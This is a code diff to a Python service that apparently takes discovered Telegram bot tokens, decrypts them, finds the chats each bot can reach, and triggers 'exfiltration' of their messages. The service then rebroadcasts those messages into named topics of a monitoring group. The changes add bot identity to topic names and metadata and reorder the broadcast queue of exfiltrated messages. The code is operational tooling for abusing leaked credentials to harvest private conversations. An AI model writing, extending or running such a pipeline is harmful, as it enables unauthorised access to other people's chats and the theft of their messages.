@@ -113,9 +113,10 @@ async def _enrich_logic(cred_id: str):
         return f"Decryption failed: {e}"
 
     # Discover
+    bot_info = {}
     try:
         print(f"🔎 [Enrich] Discovering chats via ScraperService...")
-        chats = await scraper_service.discover_chats(bot_token)
+        bot_info, chats = await scraper_service.discover_chats(bot_token)
         print(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
         if chats:
             chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
@@ -139,12 +140,37 @@ async def _enrich_logic(cred_id: str):
     print(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
     
     # Update primary
+    # Pre-create Topic with NEW FORMAT: @username / botid
+    from app.core.config import settings
+    
+    bot_username = bot_info.get("username") or "unknown"
+    bot_id = bot_info.get("id") or "0"
+    topic_name = f"@{bot_username} / {bot_id}"
+    
+    topic_id = 0
+    try:
+        topic_id = await broadcaster_service.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
+        # Send Header Message
+        if topic_id:
+             await broadcaster_service.send_topic_header(settings.MONITOR_GROUP_ID, topic_id, topic_name)
+    except Exception as e:
+        print(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")
+
+    meta_payload = {
+        "chat_name": first_chat["name"], 
+        "type": first_chat["type"], 
+        "enriched": True,
+        "bot_username": bot_username,
+        "bot_id": bot_id
+    }
+    if topic_id:
+        meta_payload["topic_id"] = topic_id
+
     db.table("discovered_credentials").update({
         "chat_id": first_chat["id"],
-        "meta": {"chat_name": first_chat["name"], "type": first_chat["type"], "enriched": True}
+        "meta": meta_payload
     }).eq("id", cred_id).execute()
     
-    # Trigger Exfiltration for Primary
     # Trigger Exfiltration for Primary
     print(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
     await broadcaster_service.send_log(f"🚀 Triggering background exfiltration task.")
@@ -155,19 +181,8 @@ async def _enrich_logic(cred_id: str):
     # Handle multiple chats
     if len(chats) > 1:
         for extra_chat in chats[1:]:
-            # Check if this token+chat combo exists? 
-            # Our unique constraint is on 'token_hash'. 
-            # So inserting the same token again will FAIL by default.
-            # We need a strategy. 
-            # Option A: 'discovered_credentials' is strictly 1 row per token. 
-            # If so, we can't support multiple chats per token in this schema without changing PK.
-            # CURRENT SCHEMA: id (PK), bot_token, token_hash (UNIQUE).
-            # Constraint: We CANNOT insert another row with same token_hash.
-            
-            # WORKAROUND for this MVP:
+             # WORKAROUND for this MVP:
             # We will only support 1 chat (the most recent/first one) per credential.
-            # Or we need to change schema.
-            # Given user constraints, let's stick to 1 chat for now and log the others in meta.
             pass
             
         if len(chats) > 1:
@@ -215,7 +230,7 @@ async def _broadcast_logic():
     response = db.table("exfiltrated_messages")\
         .select("*, discovered_credentials!inner(meta)")\
         .eq("is_broadcasted", False)\
-        .order("created_at")\
+        .order("telegram_msg_id", desc=False)\
         .limit(50)\
         .execute()
     
